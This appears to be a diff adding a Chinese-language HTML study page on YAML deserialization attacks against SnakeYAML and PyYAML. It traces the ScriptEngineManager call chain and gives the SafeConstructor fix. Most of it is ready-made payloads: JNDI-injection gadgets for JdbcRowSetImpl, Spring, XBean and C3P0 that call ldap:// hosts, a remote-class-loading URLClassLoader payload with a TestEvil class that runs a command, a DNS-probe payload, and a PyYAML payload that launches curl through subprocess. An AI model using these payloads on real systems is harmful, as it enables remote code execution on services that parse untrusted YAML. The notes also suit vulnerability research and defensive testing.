+        Person person = <span class="hljs-keyword">new</span> Person(<span class="hljs-string">&quot;ricky&quot;</span>, <span class="hljs-number">18</span>);
+        String dump = yaml.dump(person);
+        System.out.println(dump);
+    }
+}
+</code></pre>
+<p>&#x8F93;&#x51FA;&#x7ED3;&#x679C;</p>
+<pre><code>!!Person {age: 18, name: ricky}
+</code></pre><p>!! &#x540E;&#x9762;&#x8DDF;&#x5168;&#x7C7B;&#x540D;&#xFF0C;{} &#x91CC;&#x662F;&#x5C5E;&#x6027;&#x540D;&#x548C;&#x5C5E;&#x6027;&#x503C;&#xFF0C;&#x4E2D;&#x95F4;&#x4F7F;&#x7528;&#x9017;&#x53F7;&#x5206;&#x9694;&#xFF0C;sankeyaml &#x7279;&#x70B9;&#x5728;&#x4E8E;&#x5B83;&#x6CA1;&#x6709;&#x9ED1;&#x540D;&#x5355;&#xFF0C;&#x4E0D;&#x80FD;&#x8BBE;&#x7F6E;&#x79C1;&#x6709;&#x5C5E;&#x6027;&#xFF0C;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x89E6;&#x53D1;&#x7684; gadgets </p>
+<p>&#x6240;&#x4EE5;&#x91C7;&#x7528;&#x76F4;&#x63A5;&#x5BF9;&#x7C7B;&#x7684;&#x89E6;&#x53D1;</p>
+<pre><code>!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: &apos;ldap://127.0.0.1:1099/calc&apos;, autoCommit: true}
+</code></pre><p>YAML&#x57FA;&#x672C;&#x683C;&#x5F0F;&#x8981;&#x6C42;&#xFF1A;</p>
+<ol>
+<li>YAML&#x5927;&#x5C0F;&#x5199;&#x654F;&#x611F;&#xFF1B;</li>
+<li>&#x4F7F;&#x7528;&#x7F29;&#x8FDB;&#x4EE3;&#x8868;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#xFF1B;</li>
+<li><p>&#x7F29;&#x8FDB;&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x7A7A;&#x683C;&#xFF0C;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;TAB&#xFF0C;&#x4E0D;&#x8981;&#x6C42;&#x7A7A;&#x683C;&#x4E2A;&#x6570;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x76F8;&#x540C;&#x5C42;&#x7EA7;&#x5DE6;&#x5BF9;&#x9F50;&#xFF08;&#x4E00;&#x822C;2&#x4E2A;&#x6216;4&#x4E2A;&#x7A7A;&#x683C;&#xFF09;</p>
+<p>&#x6784;&#x9020;payload&#x65F6;&#x9700;&#x8981;&#x6309;&#x7167;&#x8FD9;&#x4E2A;&#x683C;&#x5F0F;&#x8981;&#x6C42;&#x8FDB;&#x884C;&#x6784;&#x9020;, &#x5426;&#x5219;&#x4F1A;&#x62A5;&#x9519;</p>
+</li>
+</ol>
+<pre><code class="lang-java"><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">snakeyaml</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{
+        Yaml yaml = <span class="hljs-keyword">new</span> Yaml();
+        yaml.load(<span class="hljs-string">&quot;!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: &apos;ldap://127.0.0.1:1099/calc&apos;,autoCommit: true}&quot;</span>);
+    }
+}
+</code></pre>
+<h3 id="scriptenginemanager">ScriptEngineManager</h3>
+<p>&#x57FA;&#x4E8E;javax.script.ScriptEngineManager&#x7684;&#x5229;&#x7528;&#x94FE;,  &#x672C;&#x6B21;&#x5229;&#x7528;&#x662F;&#x57FA;&#x4E8E;javax.script.ScriptEngineManager&#x7684;&#x5229;&#x7528;&#x94FE; </p>
+<p>TestEvil.java&#xFF0C;&#x9700;&#x8981;&#x5B9E;&#x73B0;ScriptEngineManager&#x63A5;&#x53E3;&#x7C7B;&#xFF0C;&#x5176;&#x4E2D;&#x7684;&#x9759;&#x6001;&#x4EE3;&#x7801;&#x5757;&#x7528;&#x4E8E;&#x6267;&#x884C;&#x6076;&#x610F;&#x4EE3;&#x7801;&#xFF0C;&#x5C06;&#x5176;&#x7F16;&#x8BD1;&#x6210;TestEvil.class&#x7136;&#x540E;&#x653E;&#x7F6E;&#x4E8E;&#x7B2C;&#x4E09;&#x65B9;Web&#x670D;&#x52A1;&#x4E2D;&#xFF1A; </p>
+<pre><code>import javax.script.ScriptEngine;
+import javax.script.ScriptEngineFactory;
+import java.util.List;
+
+public class TestEvil implements ScriptEngineFactory {
+
+    public TestEvil() throws Exception{
+        Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+    }
+
+    @Override
+    public String getEngineName() {
+        return null;
+    }
+
+    @Override
+    public String getEngineVersion() {
+        return null;
+    }
+
+    @Override
+    public List&lt;String&gt; getExtensions() {
+        return null;
+    }
+
+    @Override
+    public List&lt;String&gt; getMimeTypes() {
+        return null;
+    }
+
+    @Override
+    public List&lt;String&gt; getNames() {
+        return null;
+    }
+
+    @Override
+    public String getLanguageName() {
+        return null;
+    }
+
+    @Override
+    public String getLanguageVersion() {
+        return null;
+    }
+
+    @Override
+    public Object getParameter(String key) {
+        return null;
+    }
+
+    @Override
+    public String getMethodCallSyntax(String obj, String m, String... args) {
+        return null;
+    }
+
+    @Override
+    public String getOutputStatement(String toDisplay) {
+        return null;
+    }
+
+    @Override
+    public String getProgram(String... statements) {
+        return null;
+    }
+
+    @Override
+    public ScriptEngine getScriptEngine() {
+        return null;
+    }
+}
+</code></pre><p>&#x53E6;&#x5916;&#xFF0C;&#x5728;&#x5DF2;&#x653E;&#x7F6E;PoC.class&#x7684;&#x7B2C;&#x4E09;&#x65B9;Web&#x670D;&#x52A1;&#x4E2D;&#xFF0C;&#x5728;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x65B0;&#x5EFA;&#x5982;&#x4E0B;&#x6587;&#x4EF6;<code>META-INF\services\javax.script.ScriptEngineFactory</code>&#xFF0C;&#x5176;&#x4E2D;&#x5185;&#x5BB9;&#x4E3A;&#x6307;&#x5B9A;&#x88AB;&#x6267;&#x884C;&#x7684;&#x7C7B;&#x540D;TestEvil, &#x7136;&#x540E;&#x8C03;&#x7528;POC&#x5373;&#x53EF;&#x5F39;&#x51FA;&#x8BA1;&#x7B97;&#x673A;</p>
+<pre><code class="lang-java"><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">snakeyaml</span> </span>{
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{
+        Yaml yaml = <span class="hljs-keyword">new</span> Yaml();
+        yaml.load(<span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://127.0.0.1:8088/\&quot;]]]]&quot;</span>);
+    }
+}
+</code></pre>
+<p>&#x6216;&#x8005;&#x662F;&#x6253;&#x5305;&#x6210;jar&#x5305;&#x8FDB;&#x884C;&#x52A0;&#x8F7D;, &#x53C2;&#x8003;: </p>
+<ul>
+<li><a href="https://github.com/artsploit/yaml-payload" target="_blank">https://github.com/artsploit/yaml-payload</a></li>
+<li><a href="https://www.cnblogs.com/wangshuo1/p/5697746.html" target="_blank">https://www.cnblogs.com/wangshuo1/p/5697746.html</a></li>
+</ul>
+<p>&#x4E00;&#x5B9A;&#x8981;&#x653E;&#x5165;<code>META-INF\services\javax.script.ScriptEngineFactory</code>&#x624D;&#x53EF;&#x6267;&#x884C;jar&#x5305;</p>
+<h4 id="spi&#x673A;&#x5236;">SPI&#x673A;&#x5236;</h4>
+<p>&#x53C2;&#x8003;: <a href="https://www.cnblogs.com/nice0e3/p/14514882.html" target="_blank">https://www.cnblogs.com/nice0e3/p/14514882.html</a></p>
+<p>Java&#x7684;SPI&#x673A;&#x5236;&#xFF0C;&#x5B83;&#x4F1A;&#x53BB;&#x5BFB;&#x627E;&#x76EE;&#x6807;URL&#x4E2D;<code>META-INF/services</code>&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x540D;&#x4E3A;javax.script.ScriptEngineFactory&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x83B7;&#x53D6;&#x8BE5;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5E76;&#x52A0;&#x8F7D;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x4E2D;&#x6307;&#x5B9A;&#x7684;&#x7C7B;&#x3002;&#x7A0B;&#x5E8F;&#x4F1A;<code>java.util.ServiceLoder</code>&#x52A8;&#x6001;&#x88C5;&#x8F7D;&#x5B9E;&#x73B0;&#x6A21;&#x5757;&#xFF0C;&#x5728;<code>META-INF/services</code>&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5BFB;&#x627E;&#x5B9E;&#x73B0;&#x7C7B;&#x7684;&#x7C7B;&#x540D;&#xFF0C;&#x901A;&#x8FC7;<code>Class.forName</code>&#x52A0;&#x8F7D;&#x8FDB;&#x6765;,<code>newInstance()</code>&#x53CD;&#x5C04;&#x521B;&#x5EFA;&#x5BF9;&#x8C61;,&#x5E76;&#x5B58;&#x5230;&#x7F13;&#x5B58;&#x548C;&#x5217;&#x8868;&#x91CC;&#x9762;&#x3002; </p>
+<p>&#x8C03;&#x8BD5;&#x53D1;&#x73B0;&#xFF0C;&#x5728;&#x8C03;&#x7528;&#x5B8C;&#x5982;&#x4E0B;&#x8C03;&#x7528;&#x94FE;&#x83B7;&#x53D6;&#x5230;&#x7C7B;&#x540D;<code>javax.script.ScriptEngineManager</code>&#x4E4B;&#x540E;&#xFF0C;&#x4F1A;&#x8FD4;&#x56DE;&#x5230;&#x8C03;&#x7528;&#x94FE;&#x4E2D;&#x7684;construct()&#x51FD;&#x6570;&#x4E2D;&#x8C03;&#x7528;&#x83B7;&#x53D6;&#x5230;&#x7684;&#x6784;&#x9020;&#x5668;&#x7684;constrcut()&#x65B9;&#x6CD5;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x4F1A;&#x7EE7;&#x7EED;&#x904D;&#x5386;&#x89E3;&#x6790;&#x5F97;&#x5230;yaml&#x683C;&#x5F0F;&#x6570;&#x636E;&#x5185;&#x7684;<code>java.net.URLClassLoader</code>&#x7C7B;&#x540D;&#x548C;<code>java.net.URL</code>&#x7C7B;&#x540D;&#xFF1A;</p>
+<pre><code>constructDocument-&gt;constructObject-&gt;constructObjectNoCheck(&#x65B0;&#x7248;&#x7EDF;&#x4E00;&#x4E3A;constructObject)-&gt;construct-&gt;getConstructor-&gt;getClassForNode-&gt;getClassForName
+</code></pre><p>&#x8FD9;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x8FD4;&#x56DE;&#x4E86;&#x4E00;&#x4E2A;&#x53CD;&#x5C04;&#x7684;class&#x5BF9;&#x8C61; </p>
+<pre><code class="lang-java">    <span class="hljs-keyword">protected</span> Class&lt;?&gt; getClassForName(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException {
+        <span class="hljs-keyword">try</span> {
+            <span class="hljs-keyword">return</span> Class.forName(name, <span class="hljs-keyword">true</span>, Thread.currentThread().getContextClassLoader());
+        } <span class="hljs-keyword">catch</span> (ClassNotFoundException var3) {
+            <span class="hljs-keyword">return</span> Class.forName(name);
+        }
+    }
+</code></pre>
+<p>&#x4ECE;getConstructor&#x51FA;&#x6765;&#x540E;&#x7EE7;&#x7EED;&#x8DDF;&#x8FDB;construct&#x65B9;&#x6CD5;</p>
+<pre><code>result = this.getConstructor(node).construct(node);
+</code></pre><p>&#x6B64;&#x65F6;node&#x7684;type&#x503C;&#x88AB;&#x6539;&#x4E3A; <code>class javax.script.ScriptEngineManager</code>, &#x5728;&#x4E0A;&#x4E00;&#x6B65;&#x83B7;&#x53D6;&#x53CD;&#x5C04;&#x5BF9;&#x8C61;&#x5E76;&#x8D4B;&#x503C;&#x7ED9;cl&#x65F6;, &#x6267;&#x884C;&#x4E86; <code>node.setType(cl);</code> &#x8FD9;&#x4E00;&#x6B65;, &#x5C06;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x83B7;&#x53D6;&#x7684;&#x5BF9;&#x8C61;&#x8D4B;&#x503C;&#x7ED9; node&#x5B9E;&#x4F8B;&#x4E2D;&#x7684; <code>this.type</code>, &#x6240;&#x4EE5;&#x5728;&#x540E;&#x7EED;&#x6784;&#x9020;construct&#x6784;&#x9020;&#x65F6;&#x89E6;&#x53D1;&#x7684;&#x662F; <code>javax.script.ScriptEngineManager</code>  &#x7684;<code>getDeclaredConstructors</code>(&#x65E0;&#x53C2;&#x6784;&#x9020;)</p>
+<p><img src="img/1644167628524.png" alt="1644167628524"></p>
+<p>&#x968F;&#x540E; possibleConstructors &#x5B58;&#x5165;&#x53C2;&#x6570;&#x4E5F;&#x5C31;&#x662F; <code>public javax.script.ScriptEngineManager(java.lang.ClassLoader)</code>, &#x5C06;&#x83B7;&#x53D6;&#x5230;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x5F3A;&#x5236;&#x8F6C;&#x6362;&#x4E3A; <code>Constructor</code> &#x7C7B;&#x578B;</p>
+<p><img src="img/1644167851899.png" alt="1644167851899"></p>
+<p>&#x56DE;&#x53BB;&#x904D;&#x5386;&#x83B7;&#x53D6;snode&#x7684;&#x503C;&#x540E;&#x5BF9;&#x5176; <code>javax.script.ScriptEngineManager(java.lang.ClassLoader)</code> &#x8FDB;&#x884C;&#x521D;&#x59CB;&#x5316;,  &#x5176;&#x4E2D; argumentList &#x53C2;&#x6570;&#x4E3A; URLClassLoader &#x7C7B;&#x5BF9;&#x8C61;</p>
+<p><img src="img/1644168144226.png" alt="1644168144226"></p>
+<p>&#x63A5;&#x7740;&#x5C31;&#x8C03;&#x7528;&#x5230; ScriptEngineManager &#x7C7B;&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;,  &#x5728;init()&#x4E2D;&#x8C03;&#x7528;&#x4E86;initEngines()&#xFF0C;&#x8DDF;&#x8FDB;initEngines()&#xFF0C;&#x770B;&#x5230;&#x8C03;&#x7528;&#x4E86;<code>ServiceLoader&lt;ScriptEngineFactory&gt;</code> , &#x8FD9;&#x4E2A;&#x5C31;&#x662F;Java&#x7684;SPI&#x673A;&#x5236;</p>
+<p><img src="img/1644168208534.png" alt="1644168208534"></p>
+<p>&#x540E;&#x7EED;&#x4F1A;&#x8C03;&#x7528;&#x5230; <code>ServiceLoader.hasNext</code> &#x7136;&#x540E;&#x5C31;&#x662F;&#x8DDF;&#x8FDB; <code>ServiceLoader.hasNextService</code>, &#x6B64;&#x5904;&#x5C31;&#x56DE;&#x53BB;&#x8BFB;&#x53D6;  <code>META-INF/services/javax.script.ScriptEngineFactory</code> &#x83B7;&#x53D6;&#x5B9E;&#x73B0;&#x7C7B;&#x7684;&#x4FE1;&#x606F; </p>
+<p><img src="img/1644168344430.png" alt="1644168344430"></p>
+<p>&#x63A5;&#x7740;&#x5728; <code>ServiceLoader$LazyIterator.nextService()</code> &#x51FD;&#x6570;&#x4E2D;&#x8C03; <code>Class.forName()</code> &#x5373;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x6765;&#x83B7;&#x53D6;&#x76EE;&#x6807;URL&#x4E0A;&#x7684; TestEvil.class , &#x6B64;&#x65F6;&#x5728;Web&#x670D;&#x52A1;&#x7AEF;&#x4F1A;&#x770B;&#x5230;&#x88AB;&#x8BF7;&#x6C42;&#x8BBF;&#x95EE;TestEvil.class &#x7684;&#x8BB0;&#x5F55;, &#x63A5;&#x7740;c.newInstance()&#x51FD;&#x6570;&#x521B;&#x5EFA;&#x7684; TestEvil &#x7C7B;&#x5B9E;&#x4F8B;&#x4F20;&#x5165; <code>javax.script.ScriptEngineManager.cast</code> &#x6267;&#x884C;</p>
+<p><img src="img/1644168511749.png" alt="1644168511749"></p>
+<h4 id="&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;">&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;</h4>
+<p>&#x8BE5;&#x6F0F;&#x6D1E;&#x6D89;&#x53CA;&#x5230;&#x4E86;&#x5168;&#x7248;&#x672C;&#xFF0C;&#x53EA;&#x8981;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5185;&#x5BB9;&#x53EF;&#x63A7;,&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x53BB;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x653B;&#x51FB;, &#x6240;&#x4EE5;&#x5176;&#x4FEE;&#x590D;&#x65B9;&#x6848;&#x4E3A;&#x52A0;&#x5165;<code>new SafeConstructor()</code>&#x7C7B;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x6216;&#x62D2;&#x7EDD;&#x4E0D;&#x5B89;&#x5168;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;</p>
+<pre><code>Yaml yaml = new Yaml(new SafeConstructor());
+</code></pre><h3 id="jdbcrowsetimpl">JdbcRowSetImpl</h3>
+<p>POC1</p>
+<pre><code>!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: &apos;ldap://127.0.0.1:1099/calc&apos;,autoCommit: true}
+</code></pre><p>POC2(&#x7F29;&#x8FDB;&#x4EE3;&#x8868;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;, &#x4E5F;&#x5C31;&#x662F;com.sun.rowset.JdbcRowSetImpl.dataSourceName)</p>
+<pre><code>!!com.sun.rowset.JdbcRowSetImpl
+ dataSourceName: &apos;ldap://127.0.0.1:1099/calc&apos;
+ autoCommit: true
+</code></pre><p>SnakeYaml&#x5728;&#x8C03;&#x7528;Yaml.load()&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;&#x5230;JdbcRowSetImpl&#x7C7B;&#x7684;dataSourceName&#x5C5E;&#x6027;&#x7684;setter&#x65B9;&#x6CD5;&#x5373;setDataSourceName() , &#x540E;&#x7EED;&#x51FA;&#x53D1;&#x4E00;&#x7CFB;&#x5217;&#x5229;&#x7528;&#x94FE;&#x8FBE;&#x5230;JNDI&#x6CE8;&#x5165;</p>
+<h3 id="spring-propertypathfactorybean">Spring PropertyPathFactoryBean</h3>
+<p>&#x9700;&#x8981;&#x5728;&#x76EE;&#x6807;&#x73AF;&#x5883;&#x5B58;&#x5728;springframework&#x76F8;&#x5173;&#x7684;jar&#x5305; </p>
+<pre><code>        &lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-beans --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
+            &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;
+            &lt;version&gt;5.3.14&lt;/version&gt;
+        &lt;/dependency&gt;
+        &lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-context --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
+            &lt;artifactId&gt;spring-context&lt;/artifactId&gt;
+            &lt;version&gt;5.3.14&lt;/version&gt;
+        &lt;/dependency&gt;
+</code></pre><p>POC1</p>
+<pre><code>!!org.springframework.beans.factory.config.PropertyPathFactoryBean
+ targetBeanName: &quot;ldap://127.0.0.1:1099/calc&quot;
+ propertyPath: ricky
+ beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory
+  shareableResources: [&quot;ldap://127.0.0.1:1099/calc&quot;]
+</code></pre><p>POC2</p>
+<pre><code>!!org.springframework.beans.factory.config.PropertyPathFactoryBean
+ targetBeanName: &quot;ldap://127.0.0.1:1099/calc&quot;
+ propertyPath: ricky
+ beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory
+  shareableResources:
+   - &quot;ldap://127.0.0.1:1099/calc&quot;
+</code></pre><p>POC3</p>
+<pre><code>!!org.springframework.beans.factory.config.PropertyPathFactoryBean {targetBeanName: &quot;ldap://127.0.0.1:1099/calc&quot;, propertyPath: ricky, beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory {shareableResources: [&quot;ldap://127.0.0.1:1099/calc&quot;]}}
+</code></pre><p>PropertyPathFactoryBean&#x7C7B;&#x7684;beanFactory&#x5C5E;&#x6027;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x8FDC;&#x7A0B;&#x7684;Factory&#xFF0C;&#x7C7B;&#x4F3C;&#x4E8E;JNDI&#x6CE8;&#x5165;&#x7684;&#x539F;&#x7406;&#xFF0C;&#x5F53;SnakeYaml&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x8C03;&#x7528;&#x5230;&#x8BE5;&#x5C5E;&#x6027;&#x7684;setter&#x65B9;&#x6CD5;&#xFF0C;&#x901A;&#x8FC7;JNDI&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x6210;&#x529F;&#x5B9E;&#x73B0;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x7684;&#x5229;&#x7528; </p>
+<h3 id="spring-defaultbeanfactorypointcutadvisor">Spring DefaultBeanFactoryPointcutAdvisor</h3>
+<p>&#x9700;&#x8981;&#x5728;&#x76EE;&#x6807;&#x73AF;&#x5883;&#x5B58;&#x5728;springframework&#x76F8;&#x5173;&#x7684;jar&#x5305; </p>
+<p>POC1</p>
+<pre><code>set:
+   ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor
+     adviceBeanName: 
+     beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory
+       shareableResources: []
+   ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor
+     adviceBeanName: &quot;ldap://127.0.0.1:1099/calc&quot;
+     beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory
+       shareableResources: []
+</code></pre><p>POC2</p>
+<pre><code>set:
+    ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor
+      adviceBeanName: 
+      beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory
+        shareableResources: 
+          - 
+    ? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor
+      adviceBeanName: &quot;ldap://127.0.0.1:1099/calc&quot;
+      beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory
+        shareableResources:
+          -
+</code></pre><p>POC3</p>
+<pre><code>set:
+? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor {adviceBeanName: , beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory {shareableResources: []}}
+? !!org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor {adviceBeanName: &quot;ldap://127.0.0.1:1099/calc&quot;, beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory {shareableResources: []}}
+</code></pre><h3 id="apache-xbean">Apache XBean</h3>
+<pre><code>    &lt;!-- https://mvnrepository.com/artifact/org.apache.xbean/xbean-naming --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;
+            &lt;artifactId&gt;xbean-naming&lt;/artifactId&gt;
+            &lt;version&gt;4.20&lt;/version&gt;
+        &lt;/dependency&gt;
+    &lt;!-- https://mvnrepository.com/artifact/org.apache.xbean/xbean-reflect --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;
+            &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;
+            &lt;version&gt;4.15&lt;/version&gt;
+        &lt;/dependency&gt;
+</code></pre><p>POC1</p>
+<pre><code>!!org.apache.xbean.propertyeditor.JndiConverter {asText: &quot;ldap://127.0.0.1:1099/calc&quot;}
+</code></pre><p>POC2</p>
+<pre><code>!!org.apache.xbean.propertyeditor.JndiConverter
+ asText: &quot;ldap://127.0.0.1:1099/calc&quot;
+</code></pre><p>POC3</p>
+<pre><code>!!javax.management.BadAttributeValueExpException [!!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [&quot;foo&quot;,!!javax.naming.Reference [foo, &quot;test&quot;, &quot;http://127.0.0.1:8079/&quot;],!!org.apache.xbean.naming.context.WritableContext []]]
+</code></pre><h3 id="apache-commons-configuration">Apache Commons Configuration</h3>
+<p>POC</p>
+<pre><code>set:
+ ? !!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [], &quot;ldap://127.0.0.1:1099/calc&quot;]]
+</code></pre><h3 id="c3p0-jndirefforwardingdatasource">C3P0 JndiRefForwardingDataSource</h3>
+<p>POC1</p>
+<pre><code>!!com.mchange.v2.c3p0.JndiRefForwardingDataSource
+ jndiName: &quot;ldap://127.0.0.1:1099/calc&quot;
+ loginTimeout: 0
+</code></pre><p>POC2</p>
+<pre><code>!!com.mchange.v2.c3p0.JndiRefForwardingDataSource {jndiName: &quot;ldap://127.0.0.1:1099/calc&quot;, loginTimeout: 0}
+</code></pre><h3 id="c3p0-wrapperconnectionpooldatasource">C3P0 WrapperConnectionPoolDataSource</h3>
+<p>POC1</p>
+<pre><code>!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource {userOverridesAsString: &quot;HexAsciiSerializedMap:xxx;&quot;}
+</code></pre><p>POC2</p>
+<pre><code>!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource
+ userOverridesAsString: &quot;HexAsciiSerializedMap:xxx;&quot;
+</code></pre><p>&#x5176;&#x4F59;&#x7684;&#x7C7B;&#x4F3C; fastjson &#x6216; jackson &#x7684;JNDI&#x6CE8;&#x5165;&#x5747;&#x53EF;&#x5728;yaml&#x4E2D;&#x5B9E;&#x73B0;</p>
+<h3 id="urldns">URLDNS</h3>
+<p>SnakeYAML&#x5728;&#x89E3;&#x6790;&#x5E26;&#x952E;&#x503C;&#x5BF9;&#x7684;&#x96C6;&#x5408;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x5BF9;&#x952E;&#x8C03;&#x7528;hashCode&#x65B9;&#x6CD5;&#x56E0;&#x6B64;&#x4F1A;&#x89E6;&#x53D1;DNS&#x89E3;&#x6790;&#xFF0C;&#x56E0;&#x6B64;&#x901A;&#x8FC7;&#x6784;&#x9020;URL&#x5BF9;&#x8C61;&#x540E;&#x9762;&#x7B80;&#x5355;&#x52A0;&#x4E2A;: 1&#x8BA9;&#x4ED6;&#x6210;&#x4E3A;&#x4E00;&#x4E2A;mapping, &#x6D4B;&#x8BD5;<code>java.lang.String</code>&#x7C7B;&#x662F;&#x5426;&#x5B58;&#x5728;</p>
+<p>&#x53C2;&#x8003;: <a href="https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%AE%9E%E7%8E%B0Gadget%E6%8E%A2%E6%B5%8B/" target="_blank">SnakeYAML&#x5B9E;&#x73B0;Gadget&#x63A2;&#x6D4B;</a></p>
+<pre><code>key: [!!java.lang.String {}: 0, !!java.net.URL [null, &quot;[http://feycmi.dnslog.cn](http://feycmi.dnslog.cn/)&quot;]: 1]
+</code></pre><h2 id="pyyaml">PyYaml</h2>
+<p>&#x989D;&#x5916;&#x62D3;&#x5C55;PyYaml&#x7684;&#x77E5;&#x8BC6;</p>
+<h3 id="cve-2020-1747">CVE-2020-1747</h3>
+<p>&#x53C2;&#x8003;: <a href="https://gist.github.com/adamczi/23a3b6d4bb7b2be35e79b0667d6682e1" target="_blank">https://gist.github.com/adamczi/23a3b6d4bb7b2be35e79b0667d6682e1</a></p>
+<p>&#x901A;&#x8FC7;yaml&#x683C;&#x5F0F;&#x5BF9;PyYaml&#x8FDB;&#x884C;RCE</p>
+<pre><code class="lang-yaml"><span class="hljs-comment"># The `extend` function is overriden to run `yaml.unsafe_load` with </span>
+<span class="hljs-comment"># custom `listitems` argument, in this case a simple curl request</span>
+
+<span class="hljs-bullet">-</span> <span class="hljs-type">!!python</span>/object/new:yaml.MappingNode
+<span class="hljs-attr">  listitems:</span> <span class="hljs-type">!!str</span> <span class="hljs-string">&apos;!!python/object/apply:subprocess.Popen [[&quot;curl&quot;, &quot;http://127.0.0.1/rce&quot;]]&apos;</span>
+<span class="hljs-attr">  state:</span>
+<span class="hljs-attr">    tag:</span> <span class="hljs-type">!!str</span> dummy
+<span class="hljs-attr">    value:</span> <span class="hljs-type">!!str</span> dummy
+<span class="hljs-attr">    extend:</span> <span class="hljs-type">!!python</span>/name:yaml.unsafe_load
+</code></pre>
+<p>While the format of <code>python/object/apply</code> can supply states for the object, we can use <code>python/name</code> to reference a python internal function (exec, eval etc). </p>
+<blockquote>
+<p>YAML&#x4E2D;&#x4F7F;&#x7528;<code>!!</code>&#x505A;&#x7C7B;&#x578B;&#x5F3A;&#x884C;&#x8F6C;&#x6362; </p>
+</blockquote>
+<pre><code>#   !!python/object/apply       # (or !!python/object/new)
+#   args: [ ... arguments ... ]
+#   kwds: { ... keywords ... }
+#   state: ... state ...
+#   listitems: [ ... listitems ... ]
+#   dictitems: { ... dictitems ... }
+# or short format:
+#   !!python/object/apply [ ... arguments ... ]
+</code></pre><p>The 5.3.1 fixes blocked the key <code>extend</code> and <code>^__.*__$</code> to disallow setting those key with the state parameter. </p>
+<p>We discovered that we can use <code>python/object/new</code> with <code>type</code> constructor (<code>type</code> is a type&#x2026;) to create new types with some customized internal state. With this, we can bypass the <code>state</code> key block mechanism and freely set our object to something like this: </p>
